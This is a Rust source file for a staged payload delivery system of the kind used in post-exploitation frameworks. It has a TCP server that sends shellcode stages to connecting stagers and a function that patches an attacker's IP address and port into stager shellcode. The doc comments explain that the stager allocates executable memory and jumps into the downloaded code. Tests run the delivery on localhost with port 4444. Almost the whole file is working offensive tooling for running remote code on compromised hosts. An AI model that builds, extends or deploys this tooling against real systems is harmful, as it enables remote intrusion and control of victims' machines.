//! Staged payload delivery system.
//!
//! Implements the stager → stage protocol:
//! 1. Stager connects to listener
//! 2. Listener sends 4-byte stage size (little-endian)
//! 3. Listener sends stage bytes
//! 4. Stager allocates RWX memory, copies stage, jumps to it
//!
//! The stager is ~110 bytes (Linux x64) and handles:
//! - Socket creation and connection
//! - Reading stage size (4 bytes)
//! - Memory allocation via mmap
//! - Reading stage bytes
//! - Jumping to stage entry point

use std::io::{Read, Write};
use std::net::TcpStream;

/// Stage delivery server — serves stages to connecting stagers.
pub struct StageServer {
    stage_data: Vec<u8>,
    listen_port: u16,
}

impl StageServer {
    /// Create a new stage server.
    pub fn new(stage_data: Vec<u8>, listen_port: u16) -> Self {
        Self {
            stage_data,
            listen_port,
        }
    }

    /// Start the stage delivery server.
    pub fn run(&self) -> std::io::Result<()> {
        use std::net::TcpListener;

        let listener = TcpListener::bind(("0.0.0.0", self.listen_port))?;
        eprintln!("[*] Stage server listening on port {}", self.listen_port);
        eprintln!("[*] Stage size: {} bytes", self.stage_data.len());

        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let peer = stream.peer_addr()?;
                    eprintln!("[+] Stager connected from {}", peer);

                    // Send stage size (4 bytes, little-endian)
                    let size_bytes = (self.stage_data.len() as u32).to_le_bytes();
                    stream.write_all(&size_bytes)?;

                    // Send stage bytes
                    stream.write_all(&self.stage_data)?;
                    stream.flush()?;

                    eprintln!("[*] Stage delivered to {}", peer);
                }
                Err(e) => {
                    eprintln!("[-] Connection error: {}", e);
                }
            }
        }

        Ok(())
    }
}

/// Generate a stager shellcode with patched connection parameters.
pub fn generate_stager(lhost: &str, lport: u16, template: &[u8]) -> Vec<u8> {
    let mut shellcode = template.to_vec();

    // Patch IP placeholder (0x7f7f7f7f)
    if let Ok(ip_bytes) = ip_to_bytes(lhost) {
        shellcode = replace_placeholder(&shellcode, &[0x7f, 0x7f, 0x7f, 0x7f], &ip_bytes);
    }

    // Patch port placeholder (0x7e7e)
    let port_bytes = lport.to_be_bytes().to_vec();
    shellcode = replace_placeholder(&shellcode, &[0x7e, 0x7e], &port_bytes);

    shellcode
}

/// Convert IP address string to bytes.
fn ip_to_bytes(ip: &str) -> std::io::Result<Vec<u8>> {
    let parts: Vec<&str> = ip.split('.').collect();
    if parts.len() != 4 {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid IP"));
    }
    let mut bytes = Vec::with_capacity(4);
    for part in parts {
        let byte: u8 = part.parse()
            .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "Invalid octet"))?;
        bytes.push(byte);
    }
    Ok(bytes)
}

/// Replace all occurrences of a placeholder pattern.
fn replace_placeholder(data: &[u8], pattern: &[u8], replacement: &[u8]) -> Vec<u8> {
    let mut result = Vec::with_capacity(data.len());
    let mut i = 0;
    while i < data.len() {
        if data[i..].starts_with(pattern) {
            result.extend_from_slice(replacement);
            i += pattern.len();
        } else {
            result.push(data[i]);
            i += 1;
        }
    }
    result
}

/// Test the stager → stage protocol locally.
/// Connects to the stage server, downloads the stage, and validates.
pub fn test_stager_connection(host: &str, port: u16) -> std::io::Result<Vec<u8>> {
    let mut stream = TcpStream::connect((host, port))?;

    // Read stage size
    let mut size_bytes = [0u8; 4];
    stream.read_exact(&mut size_bytes)?;
    let stage_size = u32::from_le_bytes(size_bytes) as usize;

    eprintln!("[*] Stage size: {} bytes", stage_size);

    // Read stage
    let mut stage = vec![0u8; stage_size];
    stream.read_exact(&mut stage)?;

    Ok(stage)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;
    use std::thread;
    use std::time::Duration;

    #[test]
    fn test_stage_delivery() {
        let stage_data = vec![0x90, 0x90, 0x90, 0xc3]; // NOP sled + ret
        let port = 19999u16;

        // Start server in background
        let server = StageServer::new(stage_data.clone(), port);
        thread::spawn(move || {
            let _ = server.run();
        });

        // Give server time to start
        thread::sleep(Duration::from_millis(100));

        // Connect and download stage
        let received = test_stager_connection("127.0.0.1", port).unwrap();

        assert_eq!(received, stage_data);
    }

    #[test]
    fn test_generate_stager() {
        let template = vec![
            0x68, 0x7f, 0x7f, 0x7f, 0x7f, // push dword IP
            0x66, 0x68, 0x7e, 0x7e,       // push word port
        ];

        let stager = generate_stager("10.0.0.1", 4444, &template);

        // IP should be patched: 10.0.0.1 = 0x0a, 0x00, 0x00, 0x01
        assert_eq!(&stager[1..5], &[0x0a, 0x00, 0x00, 0x01]);

        // Port should be patched: 4444 = 0x11, 0x5c (network byte order)
        assert_eq!(&stager[7..9], &[0x11, 0x5c]);
    }

    #[test]
    fn test_replace_placeholder() {
        let data = vec![0x00, 0x7f, 0x7f, 0x7f, 0x7f, 0x00];
        let replacement = vec![0x0a, 0x00, 0x00, 0x01];
        let result = replace_placeholder(&data, &[0x7f, 0x7f, 0x7f, 0x7f], &replacement);

        assert_eq!(result, vec![0x00, 0x0a, 0x00, 0x00, 0x01, 0x00]);
    }
}
